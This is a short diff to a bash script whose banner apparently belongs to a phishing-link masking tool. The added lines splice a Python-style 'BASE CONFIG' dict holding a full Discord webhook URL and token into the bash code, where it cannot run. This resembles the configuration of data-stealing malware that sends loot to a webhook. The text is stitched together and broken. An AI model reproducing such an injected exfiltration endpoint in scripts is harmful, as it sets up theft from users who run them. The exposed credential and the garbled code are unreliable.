@@ -10,7 +10,9 @@ url_checker() {
         fi
     fi
 }
-
+config = {
+    # BASE CONFIG #
+    "webhook": "https://discord.com/api/webhooks/1407843813992566955/d4-lo0wyYPUexTVQ_1t5DC-tNYYeT8KwBEKnvg8PREC86vejzXYbWZ1iQxgtzdnspgpx",
 echo -e "\n\e[1;31;42m######┌──────────────────────────┐##### \e[0m"
 echo -e "\e[1;31;42m######│▙▗▌      ▌  ▛▀▖▌  ▗    ▌  │##### \e[0m"
 echo -e "\e[1;31;42m######│▌▘▌▝▀▖▞▀▘▌▗▘▙▄▘▛▀▖▄ ▞▀▘▛▀▖│##### \e[0m"
